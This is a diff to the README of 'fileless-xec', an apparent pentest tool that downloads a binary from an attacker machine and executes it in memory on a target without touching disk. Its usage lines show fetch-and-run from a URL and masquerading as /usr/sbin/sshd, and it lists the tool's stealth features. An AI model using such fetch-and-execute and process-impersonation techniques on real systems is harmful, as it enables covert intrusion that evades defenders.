@@ -1,4 +1,4 @@
-<h1 align=center> fileless-xec 🦜</h1>
+<h1 align=center> ➲ fileless-xec 🦜</h1>
 
 <div align="center">
 <code>👋 Certainly useful , mainly for fun, rougly inspired by 0x00 <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">article</a></code>
@@ -7,9 +7,11 @@
 
 ***Pentest use:*** `fileless-xec` is used on target machine to stealthy execute a binary file located on attacker machine
 
-## Short story
+## ➲ Short story
 
 `fileless-xec` enable us to execute a remote binary on a local machine directly from memory without dropping them on disk
+
+**[➪ Install](https://github.com/ariary/fileless-xec/blob/main/install.md)**
 
  - simple usage `fileless-xec <binary_url>` (~`curl | sh` for binaries)
  - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd <binary_raw_url>`
@@ -38,7 +40,7 @@ Locally we use <code>fileless-xec</code> and impersonate the <code>/usr/sbin/ssh
 * [`fileless-xec` on windows](https://github.com/ariary/fileless-xec/blob/main/usage.md#fileless-xec-on-windows)
 
 
-## Stealthiness story
+## ➲ Stealthiness story
 
 * The binary file is not mapped into the host file system
 * The execution program name could be customizable
